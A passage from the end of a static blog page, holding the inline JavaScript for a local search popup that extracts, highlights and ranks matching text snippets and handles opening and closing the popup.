                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
